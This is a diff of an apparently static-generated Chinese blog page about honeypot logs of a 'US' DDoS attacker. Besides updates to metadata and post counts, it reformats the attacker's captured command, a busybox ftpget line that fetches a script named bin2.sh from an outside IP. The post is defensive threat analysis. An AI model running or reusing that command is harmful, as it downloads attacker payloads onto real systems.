@@ -102,7 +102,7 @@
 <meta property="og:image" content="http://7xn5a6.com1.z0.glb.clouddn.com/image/jpg6.png">
 <meta property="og:image" content="http://7xn5a6.com1.z0.glb.clouddn.com/image/jpg7.png">
 <meta property="og:image" content="http://7xn5a6.com1.z0.glb.clouddn.com/image/jpg8.png">
-<meta property="og:updated_time" content="2016-07-30T16:54:09.552Z">
+<meta property="og:updated_time" content="2016-07-30T17:29:25.170Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="一个‘米国’黑客的故事">
 <meta name="twitter:description" content="By:Pghook
@@ -348,8 +348,7 @@
 <h2 id="0x03、一个“米国”DDOS黑客的故事">0x03、一个“米国”DDOS黑客的故事</h2><p>这两天，每天上班来的第二件事，就是看这个蜜罐上的数据。今天看到了一个ip很有意思，他的详细操作记录如下：</p>
 <p><img src="http://7xn5a6.com1.z0.glb.clouddn.com/image/jpg3.png" alt="img"> 时间从29号0点13到1点58，查了下这个ip，发现是“米国”的。上图右边的Input是‘米国’黑客的操作记录，估计他是够郁闷的（明明拿到root权限，但为啥很多命令执行不成功，这是哪门子的linux啊？），因为这个蜜罐支持的命令有限（蜜罐也是有点坑）。</p>
 <p><img src="http://7xn5a6.com1.z0.glb.clouddn.com/image/jpg4.png" alt="img"></p>
-<p>我其实很好奇这个黑客下载的是个啥玩意，他输入了一条命令如下：</p>
-<p>busybox ftpget -u anonymous -p anonymous192.187.97.196 bin2.sh bin2.sh</p>
+<p>我其实很好奇这个黑客下载的是个啥玩意，他输入了一条命令如下：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">busybox</span> <span class="tag">ftpget</span> <span class="tag">-u</span> <span class="tag">anonymous</span> <span class="tag">-p</span> <span class="tag">anonymous</span> 192<span class="class">.187</span><span class="class">.97</span><span class="class">.196</span> <span class="tag">bin2</span><span class="class">.sh</span> <span class="tag">bin2</span><span class="class">.sh</span></span><br></pre></td></tr></table></figure></p>
 <p>我便顺藤摸瓜，也登陆到这台ftp服务器上去看了看，如下图：</p>
 <p><img src="http://7xn5a6.com1.z0.glb.clouddn.com/image/jpg5.png" alt="img"></p>
 <p>把这几个文件都弄下来了，看看里面到底是些啥玩意，bin2.sh文件内容如下：</p>
@@ -396,8 +395,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/01/18/python操作mysql数据库（编码问题）/" rel="next" title="python操作mysql数据库（编码问题）">
-                <i class="fa fa-chevron-left"></i> python操作mysql数据库（编码问题）
+              <a href="/2016/07/10/Centos & Vmware储存空间/" rel="next" title="Centos & Vmware储存空间">
+                <i class="fa fa-chevron-left"></i> Centos & Vmware储存空间
               </a>
             
           </div>
@@ -474,7 +473,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">4</span>
+              <span class="site-state-item-count">5</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -482,7 +481,7 @@
           
             <div class="site-state-item site-state-categories">
               <a href="/categories">
-                <span class="site-state-item-count">4</span>
+                <span class="site-state-item-count">5</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -491,7 +490,7 @@
           
             <div class="site-state-item site-state-tags">
               
-                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-count">8</span>
                 <span class="site-state-item-name">标签</span>
               
             </div>
